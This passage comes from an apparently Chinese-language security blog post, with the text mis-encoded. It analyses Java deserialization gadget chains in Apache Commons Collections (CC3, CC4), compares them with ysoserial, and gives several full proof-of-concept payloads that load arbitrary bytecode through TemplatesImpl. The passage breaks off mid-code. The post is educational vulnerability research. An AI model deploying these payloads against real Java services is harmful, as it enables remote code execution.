class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æŠŠä¹‹å‰çš„æ‹¼èµ·æ¥, æˆåŠŸæ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519205440576.png" alt="image-20240519205440576"></p><p>å½“ç„¶å¯ä»¥çœ‹é…åˆCC6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”åˆ†æYsoserial</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519225316834.png" alt="image-20240519225316834"></p><p>è¿™é‡Œæœ‰äº›è®¸ä¸åŒ, å®ƒä½¿ç”¨äº†<code>InstantiateTransformer</code>è€Œä¸æ˜¯<code>InvokerTransformer</code>æ¥è°ƒç”¨<code>newTransformer</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231447711.png" alt="image-20240519231447711"></p><p>å¯ä»¥çœ‹è§<code>InstantiateTransformer</code>æ˜¯ç”¨æ¥è°ƒç”¨æ„é€ å‡½æ•°çš„, è€Œä¸æ˜¯<code>InvokerTransformer</code>é‚£æ ·æ‰§è¡Œä»»æ„æ–¹æ³•</p><p>æˆ‘ä»¬å†çœ‹<code>TrAXFilter</code>è¿™ä¸ªç±», å®ƒçš„æ„é€ å‡½æ•°ä¸­æ­£å¥½è°ƒç”¨äº†<code>templates.newTransformer()</code>æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519231136720.png" alt="image-20240519231136720"></p><p>å› æ­¤å³å¯è§¦å‘cc3é“¾æ¡</p><p>å®Œæ•´poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>CC4æ˜¯åœ¨CC3çš„åŸºç¡€ä¸Š, å‰åŠæ®µä¸åŠ¨, åœ¨è°ƒç”¨ChainedTransformerçš„transformæ–¹æ³•ä¸Šæœ‰æ‰€ä¸åŒ</p><p> ä¹‹å‰çš„CC1,CC6éƒ½æ˜¯ä»<code>LazyMap</code>æˆ–<code>TransformedMap</code>çš„getæ–¹æ³•å»è°ƒç”¨transform, è¿™é‡ŒCC4ä½¿ç”¨äº†å…¶ä»–çš„é“¾å­</p><h2 id="ä¾èµ–è°ƒæ•´"><a href="#ä¾èµ–è°ƒæ•´" class="headerlink" title="ä¾èµ–è°ƒæ•´"></a>ä¾èµ–è°ƒæ•´</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¿®æ”¹CC4ä¾èµ–ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨mavenä¸­ä¸‹è½½ä¾èµ–çš„æºç , å¦åˆ™ä¸èƒ½è°ƒè¯•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520193836140.png" alt="image-20240520193836140"></p><p>ä¸‹è½½å¥½åéšä¾¿æ‰“å¼€ä¸€ä¸ªç±»çœ‹è§æ˜¯.javaæ–‡ä»¶å°±è¡Œäº†</p><h2 id="é“¾å­åˆ†æ-3"><a href="#é“¾å­åˆ†æ-3" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><blockquote><p>å› ä¸º CommonsCollections4 é™¤ 4.0 çš„å…¶ä»–ç‰ˆæœ¬å»æ‰äº† InvokerTransformer ä¸å†ç»§æ‰¿ Serializableï¼Œå¯¼è‡´æ— æ³•åºåˆ—åŒ–ã€‚<br>åŒæ—¶ CommonsCollections 4çš„ç‰ˆæœ¬ TransformingComparator ç»§æ‰¿äº† Serializableæ¥å£ï¼Œè€ŒCommonsCollections 3é‡Œæ˜¯æ²¡æœ‰çš„ã€‚è¿™ä¸ªå°±æä¾›äº†ä¸€ä¸ªæ”»å‡»çš„è·¯å¾„</p></blockquote><p>å…ˆæ¥çœ‹çœ‹CC4çš„è°ƒç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">    PriorityQueue.heapify()  </span></span><br><span class="line"><span class="comment">        PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment">            PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment">                TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">                    ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">                            TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment">                                defineClass()-&gt;newInstance()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>CC4ä¾ç„¶ä½¿ç”¨<code>ChainedTransformer</code>, ä¸åŒçš„æ˜¯è°æ¥è°ƒç”¨<code>ChainedTransformer</code>çš„<code>transform</code></p><p>æˆ‘ä»¬è¿›å…¥<code>TransformingComparator</code>è¿™ä¸ªç±», å¯ä»¥çœ‹è§compareæ–¹æ³•ä¸­è°ƒç”¨äº†transform</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520194949703.png" alt="image-20240520194949694"></p><p>å®ƒçš„æ„é€ å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520195156711.png" alt="image-20240520195156711"></p><p>è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„transformæ–¹æ³•, å†çœ‹è°è°ƒç”¨äº†compare</p><p>åœ¨PriorityQueueè¿™ä¸ªç±»çš„siftDownUsingComparatorä¸­è°ƒç”¨äº†compare</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200620860.png" alt="image-20240520200620860"></p><p>å†çœ‹è°è°ƒç”¨äº†siftDownUsingComparator</p><p>ç­”æ¡ˆæ˜¯siftDown</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200709787.png" alt="image-20240520200709787"></p><p>ç»§ç»­</p><p><code>heapify</code>è°ƒç”¨äº†siftDown</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200752572.png" alt="image-20240520200752572"></p><p>æ­£å¥½åœ¨è¿™ä¸ªç±»çš„ReadObjectæ–¹æ³•ä¸­è°ƒç”¨äº†heapify</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520200852008.png" alt="image-20240520200852008"></p><p>æœ€ç»ˆpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        TemplatesImpl templates = new TemplatesImpl();</span></span><br><span class="line"><span class="comment">//        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span></span><br><span class="line"><span class="comment">//        name.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        name.set(templates, &quot;n4c1&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = 